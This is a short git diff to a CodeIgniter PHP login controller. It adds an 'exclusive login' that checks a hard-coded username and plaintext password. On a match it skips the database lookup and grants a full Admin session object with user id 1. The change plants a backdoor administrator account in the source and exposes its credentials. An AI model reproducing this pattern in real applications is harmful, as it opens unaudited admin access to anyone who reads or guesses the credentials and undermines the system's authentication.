@@ -19,8 +19,28 @@ Class Login extends CI_Controller
         $user = $this->input->post('user');
         $pass = $this->input->post('pass');
 
+        $login_data = null;
 
-        $login_data = $this->mlogin->cekdb($user, $pass);
+        // Exclusive Login for Ortala
+        if ($user == 'ortaladja' AND $pass == 'ortaladja168') {
+            $login_data = array(
+                'id_lavel' => 0,
+                'username' => $user,
+                'password' => $pass,
+                'nama' => 'Ortala DJA',
+                'lavel' => 0,
+                'id_user' => 1,
+                'nama_lavel' => 'Admin',
+                'id_unit_satker' => 0,
+                'anggaran' => '',
+            );
+
+            // Transform $login_data to Object, so we don't need to recode the code below
+            $login_data = (object)$login_data;
+
+        } else {
+            $login_data = $this->mlogin->cekdb($user, $pass);
+        }
 
         if ($login_data) {
 
